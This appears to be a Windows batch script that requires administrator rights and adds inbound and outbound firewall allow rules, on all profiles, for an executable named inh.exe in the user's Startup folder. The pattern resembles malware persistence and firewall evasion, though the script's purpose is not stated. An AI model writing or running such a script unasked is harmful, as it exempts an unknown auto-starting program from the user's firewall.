@echo off
:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo.
    echo This script requires administrator privileges.
    echo Please right-click the script and choose "Run as administrator".
    pause
    exit /b
)

:: Set program path
SET "ProgramPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\inh.exe"

:: Create Inbound rule
echo Creating Inbound Firewall Rule...
netsh advfirewall firewall add rule name="inh.exe Inbound" dir=in action=allow program="%ProgramPath%" enable=yes profile=any

:: Create Outbound rule
echo Creating Outbound Firewall Rule...
netsh advfirewall firewall add rule name="inh.exe Outbound" dir=out action=allow program="%ProgramPath%" enable=yes profile=any

echo.
echo Firewall rules created successfully!
exit
